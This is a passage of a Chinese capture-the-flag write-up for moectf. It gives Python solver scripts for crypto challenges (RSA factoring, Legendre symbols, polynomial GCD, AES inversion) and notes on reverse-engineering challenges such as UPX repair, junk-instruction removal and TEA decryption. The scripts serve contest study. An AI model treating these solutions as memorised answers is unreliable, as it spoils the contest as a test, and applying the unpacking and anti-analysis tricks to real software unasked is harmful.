    196747701509389071931992996873572785043, 70811811603137896158765356680364490781, 83672551582385607422240464086955462541,
    117961603623637997457153763936550310698, 224448821395214505399297116719025174412, 4598815373009554321735225938200807251,
    194892269604260726530091473301914449005, 127484628022155760909820605666827662175, 208706240846212140439291547368645656474,
    14102286481104997303651684152195298336, 6129503335471304345451795609683770657, 103799668048593149396277157385628834185,
    185813375481410513002496683918106238351, 233491689316882978147517340230794025796, 46274083097168831187719988888816378961,
    119487551553664772614629936285345836934, 84340029922118279362389419277915602509, 88253743193124528032223101368846247085,
    227895357640018330099501504941388167432, 92189947144174433744195727086236905626, 83114957902192791332190922428847199876,
    173535754090441937731619031520699325122, 192309407933789484835602071782330798398, 255421921600128994923738650157598053776,
    155535082468314012733563336837641958625, 49064798421022327310707074253263463055, 161216416471071644769301963857685054031,
    252480348817188872515008985698620059851, 75854882798183185741756645038434215611, 256065006192683011190132982128640682537,
    87507510173514424105732562474643251223, 163309795132131534875147566536485288212, 253583084320404985699510129361746869059,
    253300112521651972637580307326576568313, 239027717080729650738678032571840680727, 117444657686971615526398894470673026034,
    215470942802874046857958621181684551426, 58767098748728136687851735836323448020, 249357164697409977883764098879705065535,
    174705348385893117518084017669958647345, 211108767177375215605155301209259781232, 57829566748907062397366819001461941421,
    88265742700024922112974862134385921564, 80952107622167923709226013231566882261, 236078582132483864916117213281193714198,
    193448482646563141692726575550417225891, 245972799166806058223048506073553726233, 10132977708896091601871557249244373666,
    201785418152654519825849206312616081028, 15169816744048531212384271865884567710, 122545328290385950043826822277924297182,
    202918646192255177261567701479991753600, 32696887488223731055835744711207261936, 88319352182963224921157305627381030375,
    92381505322264045777004475690398861771, 189745654013352563126968415157143821842, 152254915005998949299817641843658795579,
    198032433618991362619448347415342295581, 84073892809321676935569114878067118319, 82243805869584256211699602267760745768,
    61994229948266781537191603999495995852, 253668765227759797787675352833142466255, 38865376724677211964966907748953557125,
    134615436811268347303232550777225944929, 176932422465426107783498083830285780588, 207573742393618910694054452362826628208,
    200033130835394442710748301293534928706, 127536063935293533700918451145963158658, 219125698281820710910675956971948816959,
    179795893258398750139395156587561075767, 69649628109726874051635160004398498964, 241433717681314766463039563422535023524,
    202664264135718511331695232476272832350, 205151096657425932591242432052912914182, 210305712465948130683966275157181140301,
    196555690055906934925300527324955477733, 66817932643964538216259564711698986077, 95270796440975607179107356182889534333,
    123226880424532374188134357659879826495, 53506495440223773538415807620524749240, 19253217887083870834249774316467647628,
    165699356396365023442008488156823647206, 107809175498119862854792975070673056027, 250453989887421415931162217952559757164,
    171492052199838424502681030556098576483, 133778166882550119563444625306816232463, 149009301604122447269581792013291889175,
    9982418254629616281350713836647603294, 203486292122499140756846060502464655972, 157686696123400087437836943220926921848,
    88338919773540412238116717043122711811, 113265824169274322024623493892867211478, 5549372099744960679418616304893848801,
    12431828907518852062050349123660880165, 183957934738536914983862053251433028750, 42027289270308356303682029801998790750,
    117406080036483925915502666019795783905, 154312255292300186042636734144948304054, 143706917273862261295046346995206133170,
    50088136095338601440516112338120787526, 250634504150859449051246497912830488025, 8073010289877796888705519374892639903,
    40049582814576788803483039836229025416, 227012342545923833983403067401561291645, 201776603581414625783054400184026088994,
    55474945478884522762318445841998187357, 221515530211550293408010846844218019597, 172650752042211610909190315288155597255,
    67046194931321172530462444254204111483, 207435868835185636819659137800256834557, 188063222224545200294767050268070647452,
    58099349021260301211275261896736590564, 23598877596106927870697531042828774738, 58546308516383335224739442370238545000,
    58125311541947998710088435169901475101, 238219925698115060748249043752036454438, 203910234934340893915761800653823457631,
    190854889967769152565565000250829375099, 37573623890629846209257307181880876288, 226220240200270623843038279593586687278,
    144246075981535671790438155977352345487, 14665770553338784222331493932533448756, 37992062606775322664977502677838074649,
    47370175759976523832233910009306151684, 97047813247943880266351445874642842468, 237607444658797800072728280983357541134,
    174853113478993738890584814806707459112, 17104608155861584438824639050715857607, 83639027011494777283064583268678718843,
    237826165608708003941944469905843354705, 231707683915242052796886276983724691027, 146089830852925550139294146760718642221,
    25604562707667550478623425477029052785, 108577663147976992047614498924706939204, 69040319834829375335287614995435269276,
    169933229202934375632745753379104389929, 72693008284867494808267387710985847974, 158548279589965576940349068403862889270,
    49458101234256610254825879149914255140, 24389558269688411084589654047215902968, 210567980379246548727819953025607019254,
    110423375132252997825868399832298953831, 109589895677661968369424757992411668628, 66177577069199763925999718357846633613,
    83602293803708828242273186265396676466, 172226271050176278536911356541786290551, 85799805809703976643034084477579915867,
    179399990302447560847151603157937241688, 81687654752229170984692833277072534294, 160766441640281044008645821822296569868,
    100306680611749750243920501921769642984, 42195187332833922597871030332905266026, 238918420772178508359295233180536910768,
    221685929158944699801776621298532178665, 209349638787804999657456057184702655805, 183953393268431043006359511952782903516,
    137364333131365794683132159746962959967, 15637689373906596015395350692459218048, 145956368418289159411911667337899986262,
    197987711355277581048877821432652325207, 125421308989313724733467092345532539875, 90525081516582408488547894471421476595,
    107405840115256692042814887586009104950, 71587500700172519801649824611045199280, 10155721246869986043302768283257682883,
    100522792569358427133597834727509523742, 244473925018526409824670892423775482110, 50746138425761666610345252577572889037,
    142188269919422432629363225167297071042, 8235113926890598897465093754260801947, 174540885017405784646782293055852044631,
    171949847901434672429841435895697323702, 34391199559497599434575002007581170988, 7337868660819385932166025474594964373,
    89608475952042154068811282935241824949, 162561097613906905390170334328135062933, 252566077272083954707900007055640560669,
    4284637988579219107997224848114896904, 220026371387782427901244689037957398829, 86019060485320999498155965142619258089,
    19304861731281576405798605142335886482, 123188238667151068575810494833929221938, 125089740978532716086813732154638565196,
    252061524500088702951562270741214799294, 89528875472312768404823823905699760649, 63307407053590054220492282094909190524,
    24389558269688411084589654047215902968, 43835777110183833958990705735152973942, 196543204310466258426232803779025620993,
    225032412767857179129234169288824097261, 50292890880286260984317361296226049436, 64928956886509273090981701066528078331,
    25408225921774957745573142542576755590, 235921667882292842303120860570747218086, 217132603855089441017750752624514343437,
    11106129204256119599329380588789107048, 147501327490657927610543345089238991876, 158091159632919983870444592039392730373,
    254215886971254771885657857148535673338, 129869106474614345624950211566868568809, 10425702332274469498479699675668087022,
    136595953187315682777976356839442311764, 1607792140397737044118662059498732982, 23710000155612873207506044342091514799,
    118571340370877720354330132780832828911, 194624784476702188629452374731837038856, 51332273108989067644245919615090753756,
    24092104340528851160365826273938845156, 158670188709175825212687487436006138030, 133641825913283256858340618209700716053,
    43054466484232130048301271684438593412, 20361972967806283315536154125012604660, 135700832615866572032111395529532615300,
    160609169788639387827865051539103507016, 100576279475451993660766480883708996211, 215424685541583305069271024253690375127,
    60018956375784961551937423504137141702, 107997941230633604720421526632224279451, 219482010609171816035007605036664317041,
    22173526221024380740269311947729076493, 249746554302052221287371350978970766087, 93207359085331319264650563354951254906,
    221421697282310997113867048083058096452, 61834092635779365101011109381392037516, 162215218701897689647766394615098617152,
    141856131587452385513407955541400099703, 177910903795887762773545874929605680469, 228832704523723308335513552177377803295,
    229427981969125094398744034150988525118, 217938760689082034514008764751385239765, 3238055163645731541423094980789895030,
    42308449860804765793467328093112118974, 254764518926620089428032312378507653680, 215733901156118606036318409454786603209,
    59640829345183339336712595595022506261, 33515071724475649656070325837411550208, 51175659069843551646353202764296812462,
    211462959696081863041546889096760952490, 230559603938699838189391087728971115767, 85878911733601049548471257838175175563,
    214134904074265214033878852207103328297, 160702405980652445507529591230654474171, 223755040649990285320102091954198427148,
    166476753890268002826149533120107157745, 26283916639129998224675164834425763384, 232971495542024495583092055361321729894,
    79741799146769724681649849525636816379, 228506526471280046809909301748098760369, 167502422063741368765891061653686283332,
    26984184590668253713951516794937308166, 105952393031190074432183821281493254, 113823192955281698937767041115166174652,
    93264047694114869263275726820602569731, 55481974783112950660682138071588408040, 108961894273530837550182447112767144669,
    47975793549419083945738147934068241928, 204024371586357035343484206754422857590, 251859351272989525849999231358507018068,
    75939709807860493804628805619699991501, 129031774446142139804436921156668129187, 110764318451937254261883856778359218969,
    246404864722813298477426808193494673610, 153818236564405157581869620439634140065, 246125932167584353084676586883038397451
]

exponent = (p - 1) // 2
symbol_for_zero = pow(a, exponent, p)
binary_flag = ""
for c in ciphertext:
    current_symbol = pow(c, exponent, p)
    if current_symbol == symbol_for_zero:
        binary_flag += &#x27;0&#x27;
    else:
        binary_flag += &#x27;1&#x27;

flag_bytes = b&#x27;&#x27;
for i in range(0, len(binary_flag), 8):
    byte_str = binary_flag[i:i+8]
    flag_bytes += long_to_bytes(int(byte_str, 2))

print(f"Flag: {flag_bytes.decode(&#x27;utf-8&#x27;)}")

### happyRSA
python40 linescopyfrom Crypto.Util.number import long_to_bytes
import gmpy2

n = 128523866891628647198256249821889078729612915602126813095353326058434117743331117354307769466834709121615383318360553158180793808091715290853250784591576293353438657705902690576369228616974691526529115840225288717188674903706286837772359866451871219784305209267680502055721789166823585304852101129034033822731
e = 65537
c = 125986017030189249606833383146319528808010980928552142070952791820726011301355101112751401734059277025967527782109331573869703458333443026446504541008332002497683482554529670817491746530944661661838872530737844860894779846008432862757182462997411607513582892540745324152395112372620247143278397038318619295886
x = 522964948416919148730075013940176144502085141572251634384238148239059418865743755566045480035498265634350869368780682933647857349700575757065055513839460630399915983325017019073643523849095374946914449481491243177810902947558024707988938268598599450358141276922628627391081922608389234345668009502520912713141

# n_phi^2 + n_phi + (1 - x) = 0
delta1 = 4 * x - 3
n_phi = (gmpy2.isqrt(delta1) - 1) // 2

print(f"n_phi: {n_phi}")

# S = p + q = n_phi + 1
S = n_phi + 1
# p和q是方程 z^2-Sz+n=0 的根
# z = (S+/-sqrt(S^2-4n))/2
delta2 = S*S - 4*n
sqrt_delta2 = gmpy2.isqrt(delta2)

p = (S + sqrt_delta2) // 2
q = (S - sqrt_delta2) // 2

print(f"p: {p}")
print(f"q: {q}")
assert n == p * q

phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
m = pow(c, d, n)
flag = long_to_bytes(m)

print(f"Flag: {flag.decode()}")

### ezHalfGCD
python127 linescopyimport gmpy2
from Crypto.Util.number import long_to_bytes
from math import comb

e = 11
n = 31166099657280475125475535365831782783093875463247358362475188588947278779261659087382153841735341294644470135658242563894811427195085499234687959821014213884097144683916979145688501653937652132196507641706592058541461494851978378234097501450088696202067780458185699118745693112795064523774316076900622924515043087514299819363383005261432426124907190050031873969718731577577610423430342011833399812571330259167141343053584093492407110726050289284883569075898031613703838488237576756303655189545592872431914967027530453720947545137077577544615857606624432667091058064432254815560483584621525418467954592836937243988243
enc_d = 13808910452602719582082356538103809869422886228259509560372242093772427733416618401205696740074353028623820317050192627491660359558892392153999532272857339481298482802886251848703046960504786528793589170539584003383632027476914361574273144291330585735179166690513545471901763697269194228467287645573188775899890375853801796593582850975578804671547453457528686518397397234277841944184055117669277697362945463508844599947716337314398521363079749738943908860398843430518505690528296941997988869732759053587554475692300841912141199296010163641185664377742397777941968394746150611710777000625916609542525700860321528867212
enc_phi = 7712799451523923934297438340493818709638100911475880659269081521797448094000671886662453371669377561442768781648787281763679814952312810588749220640616349121013802986627369725105748412428708271146640375251603852154891826036699121824706508396445679193881511426962350499448921650925902083009038656420224517990418144263810608916613943703387804258988710100695100014625921151006914635066745373266932452264209581055597451243351753611834270245107587926127995770837997657200564139159783438755362906511732933456755615781562673235575025697927723044975521898510169824612319133648292886516647301360818651593931313229819219102145
enc_flag = 894510730103475572849584456948777906177928458037601077973815297094718207962800841050676989919558783959100151883021776468599378605624814726543232609670826195546342526501910728018180564277901156145145431115589678554941920392777979439329210254339330200637295639957614541733453280727879958971862238162005775966684182859139832583501267115086918765938983728386252082360729694525611252282765144977858082339098241367689924035089953114271269967974794791094625994785638389602317004891381734713155429498571328372671258967340771255624802290579938944569672935599910907961053536945947262426210286500553262856689698523083914877686

def poly_trim(p):
    while p and p[-1] == 0:
        p.pop()
    return p

def poly_mul(p1, p2, mod):
    deg1, deg2 = len(p1) - 1, len(p2) - 1
    new_poly = [0] * (deg1 + deg2 + 1)
    for i in range(deg1 + 1):
        for j in range(deg2 + 1):
            new_poly[i + j] = (new_poly[i + j] + p1[i] * p2[j]) % mod
    return poly_trim(new_poly)

def poly_divmod(a, b, mod):
    a, b = list(a), list(b)
    if not b:
        raise ZeroDivisionError
    deg_a, deg_b = len(a) - 1, len(b) - 1
    if deg_a < deg_b:
        return [0], a
    
    q = [0] * (deg_a - deg_b + 1)
    lead_b = b[-1]
    try:
        inv_lead_b = gmpy2.invert(lead_b, mod)
    except ZeroDivisionError:
        factor = gmpy2.gcd(lead_b, mod)
        return (factor, None)

    while deg_a >= deg_b:
        lead_a = a[-1]

        coeff = (lead_a * inv_lead_b) % mod
        deg_diff = deg_a - deg_b
        q[deg_diff] = coeff

        for i in range(deg_b + 1):
            a[deg_diff + i] = (a[deg_diff + i] - coeff * b[i]) % mod
            
        a = poly_trim(a)
        deg_a = len(a) - 1
        
    return poly_trim(q), a

def poly_gcd(a, b, mod):

    while b:
        res, rem = poly_divmod(a, b, mod)
        if rem is None:
            return res
        a, b = b, rem
    return a

# 构造多项式 P1(x) = x^e - enc_d

P1 = [-enc_d % n] + [0] * (e - 1) + [1]

flag_found = False
for k in range(1, e):
    print(f"k = {k}")
    
    # 构造多项式 P2(x) = (e*x - 1)^e - enc_phi * k^e
    # 使用二项式定理展开 (e*x - 1)^e
    # (a+b)^n = sum(C(n,k) * a^k * b^(n-k))
    # a = e*x, b = -1
    P2 = [0] * (e + 1)
    for i in range(e + 1):
        # x^i 项的系数是 C(e, i) * (e^i) * (-1)^(e-i)
        coeff = (comb(e, i) * pow(e, i, n) * pow(-1, e-i, n)) % n
        P2[i] = coeff
    
    # P2(x) = P2(x) - enc_phi * k^e
    P2[0] = (P2[0] - (enc_phi * pow(k, e, n)) % n) % n

    # 计算 GCD，看是否能找到 n 的因子
    result = poly_gcd(list(P1), list(P2), n)

    # 检查结果。如果它是一个整数，那就是 n 的因子
    if isinstance(result, int) or isinstance(result, gmpy2.mpz):
        p = result
        if 1 < p < n:
            q = n // p
            if p * q == n:
                phi = (p - 1) * (q - 1)
                d = gmpy2.invert(e, phi)
                print(f"d: {d}")
                
                m = pow(enc_flag, d, n)
                flag = long_to_bytes(m)
                print(f"Flag: {flag.decode()}")
                flag_found = True
                break
            else:
                print("error")
    else:
        # 如果 GCD 是一次多项式 a*x + b，根是 -b/a
        g = poly_trim(result)
        if len(g) == 2: # 一次多项式
            b0, a1 = g[0], g[1]
            try:
                inv_a1 = gmpy2.invert(a1, n)
                d = (-b0 * inv_a1) % n
                if pow(d, e, n) == enc_d:
                    print(f"d: {d}")
                    m = pow(enc_flag, d, n)
                    flag = long_to_bytes(m)
                    print(f"Flag: {flag.decode()}")
                    flag_found = True
                    break
            except ZeroDivisionError:
                pass # 这个系数不可逆，说明我们又找到了一个因子
                
if not flag_found:
    print("error")

### Ledengre_revenge
10轮加密，用了aes，可以写出逆，注意索引变换
python147 linescopyfrom Crypto.Util.number import bytes_to_long, long_to_bytes
from Crypto.Cipher import AES

p = 251
e = 65537
p_ = 71583805456773770888820224577418671344500223401233301642692926000191389937709
key_pow = 1679283667939124174051653611794421444808492935736643969239278575726980681302
text_sq = 26588763961966808496088145486940545448967891102453278501457496293530671899568
a = [[239, 239, 251, 239], [233, 227, 233, 251], [251, 239, 251, 233], [233, 227, 251, 233]]
lis0_given = [[341, 710, 523, 1016], [636, 366, 441, 790], [637, 347, 728, 426], [150, 184, 421, 733]]
lis1_given = [[133, 301, 251, 543], [444, 996, 507, 1005], [18, 902, 379, 878], [235, 448, 836, 263]]

def function(x, pp):
    y = 0
    if x >= pp:
        y = x
    elif pow(x, (pp - 1) // 2, pp) == 1:
        y = pow(x, 2, pp)
    else:
        y = pow(x, 3, pp)
    return y

#预计算逆
reverse_251 = [[] for _ in range(256)]
for x in range(256):
    y = function(x, 251)
    if y < 256:  # ensure
        reverse_251[y].append(x)
unique_ps = {227, 233, 239, 251}
reverse_a = {}
for pa in unique_ps:
    rev = [[] for _ in range(256)]
    for x in range(256):
        y = function(x, pa)
        if y < 256:
            rev[y].append(x)
    reverse_a[pa] = rev

#爆破key
key = None
for k in range(1 << 16):
    if pow(k, 2 * e, p_) == key_pow:
        key = k
        break
print(f"Found key: {key} (binary: {bin(key)[2:].zfill(16)})")

#AES key
aes_key_bytes = long_to_bytes(key << 107)
cipher = AES.new(aes_key_bytes, AES.MODE_ECB)

def tonelli_shanks(n, pp):
    if n == 0:
        return 0
    leg = pow(n, (pp - 1) // 2, pp)
    if leg != 1:
        return None
    q = pp - 1
    s = 0
    while q % 2 == 0:
        q //= 2
        s += 1
    z = 2
    while pow(z, (pp - 1) // 2, pp) != pp - 1:
        z += 1
    m = s
    c = pow(z, q, pp)
    t = pow(n, q, pp)
    r = pow(n, (q + 1) // 2, pp)
    while True:
        if t == 0:
            return 0
        if t == 1:
            return r
        i = 1
        t2 = pow(t, 2, pp)
        while t2 != 1:
            t2 = pow(t2, 2, pp)
            i += 1
        if i == m:
            return None
        b = pow(c, 1 << (m - i - 1), pp)
        m = i
        c = pow(b, 2, pp)
        t = (t * c) % pp
        r = (r * b) % pp

#求平方根
sqrt_r = tonelli_shanks(text_sq, p_)
if sqrt_r is None:
    print("No square root found, error")
    exit(1)
r1 = sqrt_r
r2 = p_ - sqrt_r
candidates = [r1, r2]

def reverse_half(current_text, lis_given):
    current = bytearray(current_text)
    for round_num in range(9, -1, -1):
        bit_pos = 9 - round_num
        enc_list = []
        multiple_positions = []
        has_multiple = False
        for row in range(4):
            for col in range(4):
                k = row * 4 + col
                y = current[k]
                pa = a[row][col]
                thresh = pa // 2
                bit = (lis_given[row][col] >> bit_pos) & 1
                possible_x = [x for x in reverse_a[pa][y] if (x > thresh) == (bit == 1)]
                possible_z = set()
                for x in possible_x:
                    possible_z.update(reverse_251[x])
                if not possible_z:
                    return None
                possible_z = list(possible_z)
                enc_list.append(possible_z)
                if len(possible_z) > 1:
                    has_multiple = True
                    multiple_positions.append((k, possible_z))
        
        if has_multiple:
            return None
        else:
            enc_bytes = bytearray([lst[0] for lst in enc_list])
            prev = cipher.decrypt(enc_bytes)
            current = bytearray(prev)
    return bytes(current)

flag = None
for r in candidates:
    full = long_to_bytes(r)
    if len(full) < 32:
        full = b&#x27;\\x00&#x27; * (32 - len(full)) + full
    if len(full) != 32:
        continue
    text0 = full[:16]
    text1 = full[16:]
    flag0 = reverse_half(text0, lis0_given)
    if flag0 is None:
        continue
    flag1 = reverse_half(text1, lis1_given)
    if flag1 is None:
        continue
    flag_candidate = flag0 + flag1
    print(f"{flag_candidate}")

## reverse
### speed
动态调试在creatwindow下断点，单步调试，flag在window上，照抄即可
### base
标准base64，直接解码即可
### catch
nop掉exception即可
### upx
upx脱壳，简单异或加密，注意输入的最后是换行符，因此可以倒推：
python17 linescopyv6 = [
    35, 43, 39, 54, 51, 60, 3, 72, 100, 11,
    29, 118, 123, 16, 11, 58, 63, 101, 118, 41,
    21, 55, 28, 10, 8, 33, 62, 60, 61, 22,
    11, 36, 41, 36, 86
]

flag_chars = [0] * 35
next_char = 10

for i in range(34, -1, -1):
    current_char = v6[i] ^ 0x21 ^ next_char
    flag_chars[i] = current_char
    next_char = current_char
flag = &#x27;&#x27;.join(chr(c) for c in flag_chars)
print("Flag:", flag)

### ez3
本来爆破出来了一个，但是交上去不对，后来才发现有多解，于是把每个位置所有可能值都打印出来看看哪个符合flag格式
python41 linescopydef cpp_srem(a, n):
    if n == 0:
        return a
    rem = a % abs(n)
    if a < 0:
        return -rem
    return rem

def find_all_solutions():
    a = [
        0xB1B0, 0x5678, 0x7FF2, 0xA332, 0xA0E8, 0x364C, 0x2BD4, 0xC8FE,
        0x4A7C, 0x18, 0x2BE4, 0x4144, 0x3BA6, 0xBE8C, 0x8F7E, 0x35F8,
        0x61AA, 0x2B4A, 0x6828, 0xB39E, 0xB542, 0x33EC, 0xC7D8, 0x448C,
        0x9310, 0x8808, 0xADD4, 0x3CC2, 0x796, 0xC940, 0x4E32, 0x4E2E,
        0x924A, 0x5B5C
    ]

    all_options = [[] for _ in range(34)]
    for i in range(34):
        b_prev = a[i - 1] if i > 0 else 0
        for char_code in range(32, 127):
            if i == 0:
                calc_val = 47806 * char_code
            else:
                calc_val = (47806 * (char_code + i)) ^ b_prev ^ 0x114514
            b_i = cpp_srem(calc_val, 51966)
            if b_i == a[i]:
                all_options[i].append(chr(char_code))
    flag = ""
    for i, options in enumerate(all_options):
        print(f"位置 {i:02d}: {options}")
        if options:
            flag += options[0]
        else:
            flag += "?"
    print(f"moectf{{{flag}}}") #这个是根据所有第一个候选值拼接出来的，不一定对

if __name__ == &#x27;__main__&#x27;:
    find_all_solutions()

### flower
只有一句需要处理的花指令，je，jne相当于必定跳转，于是下面导致静态分析出问题的jmp可以直接nop掉，之后分析算法，发现给的key解出来是乱码，猜测会修改key，由于key只有一字节，爆破即可
python22 linescopydef solve(key):
    enc = [
        0x4F, 0x1A, 0x59, 0x1F, 0x5B, 0x1D, 0x5D, 0x6F, 0x7B, 0x47, 0x7E,
        0x44, 0x6A, 0x07, 0x59, 0x67, 0x0E, 0x52, 0x08, 0x63, 0x5C, 0x1A,
        0x52, 0x1F, 0x20, 0x7B, 0x21, 0x77, 0x70, 0x25, 0x74, 0x2B
    ]
    initial_key = key
    content_chars = []
    for i in range(len(enc)):
        current_key = initial_key + i
        encoded_value = enc[i]
        original_char_code = encoded_value ^ current_key
        content_chars.append(chr(original_char_code))
    content = "".join(content_chars)
    flag = f"moectf{{{content}}}"
    return flag

if __name__ == &#x27;__main__&#x27;:
    for i in range(0x100):
        flag = solve(i)
        print(i,flag)

### A cup of tea
tea加密
python29 linescopyimport struct

def decrypt(v, k):
    v0, v1 = v
    delta = 0x114514
    s = delta * 32
    for _ in range(32):
        v1 -= (((v0 << 4) + k[2]) ^ (v0 + s) ^ ((v0 >> 5) + k[3])) & 0xFFFFFFFF
        v1 &= 0xFFFFFFFF
        v0 -= (((v1 << 4) + k[0]) ^ (v1 + s) ^ ((v1 >> 5) + k[1])) & 0xFFFFFFFF
        v0 &= 0xFFFFFFFF
        s -= delta
        s &= 0xFFFFFFFF
    return [v0, v1]

key = [289739801, 427884820, 1363251608, 269567252]
cipher = [
    2026214571, 578894681, 1193947460, 
    -229306230 & 0xFFFFFFFF, 73202484, 961145356, 
    -881456792 & 0xFFFFFFFF, 358205817, -554069347 & 0xFFFFFFFF, 
    119347883
]
cipher_blocks = [cipher[i:i+2] for i in range(0, len(cipher), 2)]
decrypted_flag = b""
for block in cipher_blocks:
    decrypted_block = decrypt(block, key)
    decrypted_flag += struct.pack(&#x27;<LL&#x27;, decrypted_block[0], decrypted_block[1])
print(decrypted_flag.decode(&#x27;utf-8&#x27;).strip(&#x27;\\x00&#x27;))

### ezpy
丢给PyLingual，可得py源码：
python20 linescopydef caesar_cipher_encrypt(text, shift):
    result = []
    for char in text:
        if char.isalpha():
            if char.islower():
                new_char = chr((ord(char) - ord(&#x27;a&#x27;) + shift) % 26 + ord(&#x27;a&#x27;))
            elif char.isupper():
                new_char = chr((ord(char) - ord(&#x27;A&#x27;) + shift) % 26 + ord(&#x27;A&#x27;))
            result.append(new_char)
        else:
            result.append(char)
    return &#x27;&#x27;.join(result)
user_input = input(&#x27;please input your flag：&#x27;)
a = 1
if a != 1:
    plaintext = user_input
    shift = 114514
    encrypted_text = caesar_cipher_encrypt(plaintext, shift)
    if encrypted_text == &#x27;wyomdp{I0e_Ux0G_zim}&#x27;:
        print(&#x27;Correct!!!!&#x27;)
凯撒密码，shift为114514，cyberchef一把梭
### mazegame
迷宫题，能直接提取字符串迷宫，bfs即可（所以为什么flag不对路径做一下哈希，也太长了吧）
python92 linescopyimport collections

def solve():
    maze_data = [
        "11111111111111111111111111111111111111111111111111111111",
        "10100000000000000010000011011101011111111101011100000111",
        "10111010111111111010111011000001000001000001000101110111",
        "10000010000010000010001011011111111101110111011101110111",
        "10111111111011101110111011010000000000010100010001110111",
        "10100000001000101000100011010101111111011101110101110111",
        "10101011111110111011101011010101000001000000010101110111",
        "10101010000010100000101011110101110101111101111111110111",
        "10111010111010101111101011100101000100000101000101110111",
        "10000010001010001000001011001111011111010101011101110111",
        "11111011101011111011111111101000100000101100101001110111",
        "10001010001000100010000010001010011000100010010011000001",
        "10111010111110101010111011011001011111010101011101011101",
        "10001010001000001010001011000101000100000101000101011101",
        "11101011101111111011101011110101110111111101110101011101",
        "10001000101000001010001011000100010100000101000101011101",
        "10111111101011101110111011011111110101110111011101011101",
        "10001000001000100000001011000100000100010000000101011001",
        "11101011111011111111101011110101111101111111110101011011",
        "10101000000010001000101011010100000001000100010101011011",
        "10101111111110101010101011010111111111010101010101011011",
        "10100000000000100010101011010000000000010001010101011011",
        "10111111111111111110111011011111111111111111011101011011",
        "10000000001111000000000011110111010000111100011111011011",
        "11101111100000011011011111111010110111011101100001011011",
        "11101111111111111011011111111101110111101101100001011011",
        "10001000111111000010000011111010110111011101100001011011",
        "10111010111111111010111011110111010000111101100001010011",
        "10000010000010000010001011111111111111111101100001010111",
        "10111111111011101110111011110001000110001101100001010001",
        "10100000001000101000100011110111011101111101100001011101",
        "10101011111110111011101011110001000101111101100001011101",
        "10101010000010100000101011111101011101111101100001011101",
        "10111010111010101111101011110001000110001101100001011101",
        "10000010001010101000001011111111111111111101100001011101",
        "11111011101011111011111110000000000000001101100001011101",
        "10001010001000100010000011111111111111111100110011011101",
        "10111010111110101010111010010000000011111110001111011101",
        "10001010001000001010001010110111000001111110100101011101",
        "11101011101111111011101000110011001111111100110111011101",
        "10001000101000001010001011111111111111111111110111010001",
        "10111111101011101110111010100001001100000000000011011011",
        "10001000001000100000001011111111111101011101111001011011",
        "10101011111011111111101011000000000001000100010111011011",
        "10101000000010001000101010010111111111111111111111011011",
        "10101111111110101010101010110111111111111111111101011011",
        "10100000000000100010101011100000000000000000000011011011",
        "10111111111111111110011011111111111111111111111011011011",
        "10000011111111111111000010000000000000000000000000011001",
        "11111011111111111111111111111111111111111111111111111101",
        "11111011100001100110110111000000000000000000000111111101",
        "11111011101111011010000111011111111111111111110111111101",
        "11111011100001000010110110000111111111111111110000000001",
        "11111011101111011010110111101111111111111111111111111111",
        "11110000000000011000110000000000000000000000000000000011",
        "11111111111111111111111111111111111111111111111111111111",
    ]
    padded_maze = [row.ljust(56, &#x27;1&#x27;) for row in maze_data]
    start_pos = (1, 1)   # (y, x)
    end_pos = (15, 32) # (y, x)
    height = 56
    width = 56
    queue = collections.deque([(start_pos[0], start_pos[1], "")])
    visited = {start_pos}

    while queue:
        y, x, path = queue.popleft()
        if (y, x) == end_pos:
            return path
        moves = {
            &#x27;D&#x27;: (y, x + 1),
            &#x27;S&#x27;: (y + 1, x),
            &#x27;A&#x27;: (y, x - 1),
            &#x27;W&#x27;: (y - 1, x),
        }
        for move_char, (next_y, next_x) in moves.items():
            if 0 <= next_y < height and 0 <= next_x < width:
                if (next_y, next_x) not in visited and padded_maze[next_y][next_x] == &#x27;0&#x27;:
                    visited.add((next_y, next_x))
                    new_path = path + move_char
                    queue.append((next_y, next_x, new_path))
    return "None"

if __name__ == &#x27;__main__&#x27;:
    solution_path = solve()
    print("path：")
    print(solution_path)

### upx_revenge
附件中的1.exe打不开，用cff加载发现file size比pe size少了4byte，用ida打开发现start函数前面4个push被吞了，所以缺失的4字节在upx0区段前，观察upx头，有版本号4.24但是没有魔数UPX!，并且4.24后紧跟的0D 24 02 08是upx压缩方法，所以缺失的4字节正好是UPX!，插入UPX!保存，能成功upx -d，拖进ida，发现是base64+异或，直接解即可
python10 linescopyimport base64

cipher = r"lY7bW=\\ck?eyjX7]TZ\\}CVbh\\tOyTH6>jH7XmFifG]H7".encode(&#x27;latin1&#x27;)

b64_bytes = bytes([b ^ 0x0E for b in cipher])
print("b64 string:", b64_bytes.decode(&#x27;latin1&#x27;))
plain = base64.b64decode(b64_bytes)
print("bytes:", plain)

### Two cups of tea
xtea+xxtea
python86 linescopyimport struct

def U32(x):
    return x & 0xFFFFFFFF

def F(param_A, param_B, sub_key, round_const):
    term1 = U32((param_A << 4) ^ (param_B >> 3))
    term2 = U32((param_A >> 5) ^ (param_B << 2))
    term3 = U32(round_const ^ param_B)
    term4 = U32(sub_key ^ param_A)
    return U32(U32(term1 + term2) ^ U32(term3 + term4))

def encrypt(plain_dwords, key):
    s = [U32(c) for c in plain_dwords]
    round_sum = U32(0)
    delta = 0x61C88647
    for _ in range(11):
        v25 = U32(round_sum - delta)
        key_base_idx = (v25 >> 2) & 3
        k = [key[key_base_idx ^ i] for i in range(4)]
        key_schedule = [k[0], k[1], k[2], k[3], k[0], k[1], k[2], k[3], k[0], k[1]]
        s_next = [0] * 10
        s_next[0] = U32(s[0] + F(s[9], s[1], key_schedule[0], v25))
        s_next[1] = U32(s[1] + F(s_next[0], s[2], key_schedule[1], v25))
        s_next[2] = U32(s[2] + F(s_next[1], s[3], key_schedule[2], v25))
        s_next[3] = U32(s[3] + F(s_next[2], s[4], key_schedule[3], v25))
        s_next[4] = U32(s[4] + F(s_next[3], s[5], key_schedule[4], v25))
        s_next[5] = U32(s[5] + F(s_next[4], s[6], key_schedule[5], v25))
        s_next[6] = U32(s[6] + F(s_next[5], s[7], key_schedule[6], v25))
        s_next[7] = U32(s[7] + F(s_next[6], s[8], key_schedule[7], v25))
        s_next[8] = U32(s[8] + F(s_next[7], s[9], key_schedule[8], v25))
        s_next[9] = U32(s[9] + F(s_next[8], s_next[0], key_schedule[9], v25))
        s = s_next
        round_sum = v25
    return s

def decrypt(cipher_dwords, key):
    s = [U32(c) for c in cipher_dwords]
    delta = 0x61C88647
    round_sum = U32(0 - delta * 11)
    for _ in range(11):
        v25 = round_sum
        key_base_idx = (v25 >> 2) & 3
